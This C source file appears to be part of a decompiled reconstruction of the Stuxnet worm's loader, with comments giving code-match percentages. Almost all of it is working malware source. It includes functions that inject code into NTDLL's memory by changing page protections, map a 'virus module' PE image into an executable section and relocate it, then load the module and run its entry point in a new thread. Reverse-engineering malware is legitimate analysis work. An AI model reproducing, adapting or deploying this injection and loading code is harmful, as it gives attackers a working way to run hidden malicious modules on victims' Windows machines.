/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "C. CodeBlock.h"
#include "8. AssemblyBlock1.h"
#include "9. AssemblyBlock2.h"

#include "config.h"

// 98% (C) CODE MATCH
INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
{
	HANDLE hThread; // [sp+0h] [bp-98h]@8
	HMODULE pVirusModule; // [sp+4h] [bp-94h]@5
	HANDLE hMappedAddress; // [sp+8h] [bp-90h]@11
	INT32 iResult; // [sp+Ch] [bp-8Ch]@1
	PVIRUS_MODULE_BLOCKS_HEADER pVirusModuleSection; // [sp+10h] [bp-88h]@1
	PHARDCODED_ADDRESSES pHardAddrs; // [sp+14h] [bp-84h]@1
	GENERAL_INFO_BLOCK sInfoBlockCopy; // [sp+18h] [bp-80h]@1

	pVirusModuleSection = (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
	
	BLOCK4_memcpy(&sInfoBlockCopy, pVirusModuleSection, sizeof(GENERAL_INFO_BLOCK));
	
	sInfoBlockCopy.OriginalAddress = (DWORD)&sInfoBlockCopy ^ X_PTR_KEY;
	sInfoBlockCopy.UnknownZero0 = 0;
	sInfoBlockCopy.AlignAddressesFunction = sASMCodeBlocksHeader->AlignAddresses;
	
	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)pVirusModuleSection->VirusModuleSegment.SegmentAddress, pVirusModuleSection->VirusModuleSegment.SegmentSize);
	if(iResult) return iResult;
	
	iResult = BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs);
	if(iResult) return -4;
	
	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
	if(!pVirusModule) return -9;
	
	pVirusModuleSection->VirusModulePointer = pVirusModule;
	if(pVirusModuleSection->LibraryExecuteEntryNumber != -1)
	{
		hThread = pHardAddrs->CreateThread(NULL, 0x00080000, (LPTHREAD_START_ROUTINE)sASMCodeBlocksHeader->ExecuteLibrary, sASMCodeBlocksHeader, 0, NULL);
		
		if(!hThread) return -13;
		
		pHardAddrs->WaitForSingleObject(hThread, -1);
		pHardAddrs->GetExitCodeThread(hThread, (LPDWORD)&iResult);
	}
	
	hMappedAddress = sInfoBlockCopy.MappedAddress;
	if(sInfoBlockCopy.MappedAddress)
	{
		sInfoBlockCopy.MappedAddress = 0;
		pHardAddrs->ZwClose(hMappedAddress);
	}
	
	pHardAddrs->UnmapViewOfFile(pVirusModuleSection);
	return iResult;
}

// 99% (C) CODE MATCH
INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
{
	FARPROC pLibraryExecEntry; // [sp+0h] [bp-Ch]@1
	PVIRUS_MODULE_BLOCKS_HEADER pVirusModuleSection; // [sp+4h] [bp-8h]@1
	PHARDCODED_ADDRESSES pHardAddrs; // [sp+8h] [bp-4h]@1

	pVirusModuleSection = (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
	pHardAddrs          = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
	
	pLibraryExecEntry = pHardAddrs->GetProcAddress(pVirusModuleSection->VirusModulePointer, (LPCSTR)pVirusModuleSection->LibraryExecuteEntryNumber);
	
	if(pLibraryExecEntry)
	{
		// Note: Same arguments passed to the 15th function of the internal library, maybe it was another module loaded in the past?
		((__tLibraryExecEntry)pLibraryExecEntry)((LPVOID)pVirusModuleSection->UnknownSegment.SegmentAddress, pVirusModuleSection->UnknownSegment.SegmentSize);
		return 0;
	}
	
	pHardAddrs->FreeLibrary(pVirusModuleSection->VirusModulePointer);
	return 0;
}

// 99% (C) CODE MATCH
void BLOCK4_CopyPEHeaderInfo(PGENERAL_INFO_BLOCK sInfoBlock, PIMAGE_NT_HEADERS pImageNT, INT32 iVirusModuleSize)
{
	sInfoBlock->AbsoluteEntryPoint = pImageNT->OptionalHeader.ImageBase + pImageNT->OptionalHeader.AddressOfEntryPoint;
	sInfoBlock->UnknownZero1 = 0;
	sInfoBlock->SizeOfStackReserve = pImageNT->OptionalHeader.SizeOfStackReserve;
	sInfoBlock->SizeOfStackCommit = pImageNT->OptionalHeader.SizeOfStackCommit;
	sInfoBlock->Subsystem = pImageNT->OptionalHeader.Subsystem;
	sInfoBlock->MinorSubsystemVersion = pImageNT->OptionalHeader.MinorSubsystemVersion;
	sInfoBlock->MajorSubsystemVersion = pImageNT->OptionalHeader.MajorSubsystemVersion;
	sInfoBlock->UnknownZero2 = 0;
	sInfoBlock->Charactersitics = pImageNT->FileHeader.Characteristics;
	sInfoBlock->DllCharacteristics = pImageNT->OptionalHeader.DllCharacteristics;
	sInfoBlock->Machine = pImageNT->FileHeader.Machine;
	sInfoBlock->UnknownOne = 1;
	sInfoBlock->UnknownFour = 4;
	sInfoBlock->LoaderFlags = pImageNT->OptionalHeader.LoaderFlags;
	sInfoBlock->VirusModuleSize = iVirusModuleSize;
	sInfoBlock->UnknownZero3 = 0;
}

// 94% (C) CODE MATCH
NTSTATUS BLOCK4_AlignAddresses(PIMAGE_DOS_HEADER *pImageDOS)
{
	DWORD *dwItemAddress; // ST08_4@20
	WORD *wTypeOffset; // [sp+8h] [bp-24h]@12
	UINT32 iDeltaSizeOfBlock; // [sp+Ch] [bp-20h]@12
	UINT32 j; // [sp+10h] [bp-1Ch]@14
	PIMAGE_NT_HEADERS pImageNT; // [sp+18h] [bp-14h]@6
	DWORD pImageBaseDelta; // [sp+1Ch] [bp-10h]@6
	DWORD pImageBase; // [sp+24h] [bp-8h]@4
	PIMAGE_BASE_RELOCATION i; // [sp+28h] [bp-4h]@10

	if(!pImageDOS || !*pImageDOS)
		return STATUS_ACCESS_VIOLATION;
	
	pImageBase = (DWORD)pImageDOS;
	if((*pImageDOS)->e_magic != MZ_HEADER)
		return STATUS_ACCESS_VIOLATION;
	
	pImageNT = (PIMAGE_NT_HEADERS)(pImageBase + (*pImageDOS)->e_lfanew);
	pImageBaseDelta = (DWORD)(pImageBase - pImageNT->OptionalHeader.ImageBase);
	
	if(pImageBase == pImageNT->OptionalHeader.ImageBase)
		return STATUS_SUCCESS;
	
	pImageNT->OptionalHeader.ImageBase = pImageBase;
	if(!pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
		return STATUS_CONFLICTING_ADDRESSES;
	
	for(i = (PIMAGE_BASE_RELOCATION)(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + pImageBase); i->SizeOfBlock; i += i->SizeOfBlock/sizeof(IMAGE_BASE_RELOCATION))
	{
		iDeltaSizeOfBlock = i->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION);
		wTypeOffset = (WORD *)(i + 1);
		
		if(iDeltaSizeOfBlock % 2)
			return STATUS_CONFLICTING_ADDRESSES;
		
		for(j = 0; j < iDeltaSizeOfBlock / 2; ++j)
		{
			if((UINT8)((*wTypeOffset / 0x100) / 0x10) != IMAGE_REL_BASED_ABSOLUTE)
			{
				if((UINT8)((*wTypeOffset / 0x100) / 0x10) != IMAGE_REL_BASED_HIGHLOW)
					return STATUS_CONFLICTING_ADDRESSES;
				
				dwItemAddress = (DWORD *)((*wTypeOffset & 0x0FFF) + i->VirtualAddress + pImageBase);
				*dwItemAddress += pImageBaseDelta;
			}
			
			wTypeOffset++;
		}
	}
	
	return 0;
}

// 100% (ASM) CODE MATCH
__declspec(naked) void BLOCK4_memcpy(void *pDestination, const void *pSource, unsigned int iSize)
{
	__asm {
		push    ebp
		mov     ebp, esp
		push    esi
		push    edi
		mov     edi, pDestination
		mov     esi, pSource
		mov     ecx, iSize
		rep movsb
		pop     edi
		pop     esi
		pop     ebp
		retn
	}
}

// 99% (C) CODE MATCH
void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT, LPVOID pMapViewOfFile)
{
	INT32 dwNumberOfSections; // [sp+0h] [bp-Ch]@1
	PIMAGE_SECTION_HEADER pImageSections; // [sp+4h] [bp-8h]@1
	INT32 dwCurrentSection; // [sp+8h] [bp-4h]@1

	dwNumberOfSections = pImageNT->FileHeader.NumberOfSections;
	BLOCK4_memcpy(pMapViewOfFile, pVirusModule, pImageNT->OptionalHeader.SizeOfHeaders);
	pImageSections = (PIMAGE_SECTION_HEADER)((DWORD)pImageNT + pImageNT->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD));
	
	// Copy section by section
	for(dwCurrentSection = 0; dwCurrentSection < dwNumberOfSections; dwCurrentSection++, pImageSections++)
	{
		if(pImageSections->SizeOfRawData) // If the section VirtualSize is valid copy the entire section
			BLOCK4_memcpy((void *)((DWORD)pMapViewOfFile + pImageSections->VirtualAddress), (const void *)((DWORD)pVirusModule + pImageSections->PointerToRawData), pImageSections->SizeOfRawData);
	}
}

// 99% (C) CODE MATCH
INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, PHARDCODED_ADDRESSES pHardAddrs)
{
	HMODULE hHandleNTDLL; // [sp+8h] [bp-Ch]@1
	void *v4; // [sp+Ch] [bp-8h]@3
	DWORD dwOld; // [sp+10h] [bp-4h]@5

	hHandleNTDLL = pHardAddrs->NTDLL_DLL;
	if(!pHardAddrs->NTDLL_DLL) return 0;
	
	v4 = (void *)(hHandleNTDLL + 16);
	if(*(_DWORD *)(hHandleNTDLL + 16) == 0xAB49103B) return 0; // Check if the code has been already injected
	
	if(pHardAddrs->VirtualProtect(hHandleNTDLL, 0x1000, PAGE_EXECUTE_WRITECOPY, &dwOld))
	{
		BLOCK4_memcpy(v4, (const void *)sASMCodeBlocksHeader->ASMBlock0Segment.SegmentAddress, sASMCodeBlocksHeader->ASMBlock0Segment.SegmentSize); // inject the code
		((void (__thiscall *)(void *))sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress)(v4); // __thiscall ignored by compiler
		pHardAddrs->FlushInstructionCache((HANDLE)-1, NULL, 0);
		
		return 0;
	}
	
	return -4;
}

// 97% (C) CODE MATCH
INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_BLOCK *sInfoBlock, PVOID pVirusModule, INT32 iVirusModuleSize)
{
	PIMAGE_NT_HEADERS pImageNT; // [sp+0h] [bp-1Ch]@3
	LARGE_INTEGER liMaximumSize; // [sp+4h] [bp-18h]@5
	NTSTATUS iStatus; // [sp+Ch] [bp-10h]@5
	LPVOID pMapViewOfFile; // [sp+10h] [bp-Ch]@7
	HANDLE hSectionHandle; // [sp+14h] [bp-8h]@5
	PIMAGE_DOS_HEADER pImageDOS; // [sp+18h] [bp-4h]@1

	sInfoBlock->MappedAddress = 0;
	pImageDOS = (PIMAGE_DOS_HEADER)pVirusModule;
	
	if(((PIMAGE_DOS_HEADER)pVirusModule)->e_magic != MZ_HEADER) return -2;
	
	pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusModule + pImageDOS->e_lfanew);
	if(pImageNT->Signature != PE_HEADER) return -2;
	
	liMaximumSize.LowPart  = pImageNT->OptionalHeader.SizeOfImage; // 0x00006000
	liMaximumSize.HighPart = 0;
	
	// ZwCreateSection(..., 0xF001F, 0, ..., 64, 0x8000000, 0)
	iStatus = pHardAddrs->ZwCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
	if(iStatus != STATUS_SUCCESS) return -11;
	
	pMapViewOfFile = pHardAddrs->MapViewOfFile(hSectionHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if(!pMapViewOfFile)
	{
		pHardAddrs->ZwClose(hSectionHandle);
		return -10;
	}
	
	sInfoBlock->MappedAddress = hSectionHandle;
	BLOCK4_CopyDataIntoMapView(pVirusModule, pImageNT, pMapViewOfFile);
	BLOCK4_CopyPEHeaderInfo(sInfoBlock, pImageNT, iVirusModuleSize);
	
	pHardAddrs->UnmapViewOfFile(pMapViewOfFile);
	
	return 0;
}

// 100% (ASM) CODE MATCH
void BLOCK4_END(void)
{
	;
}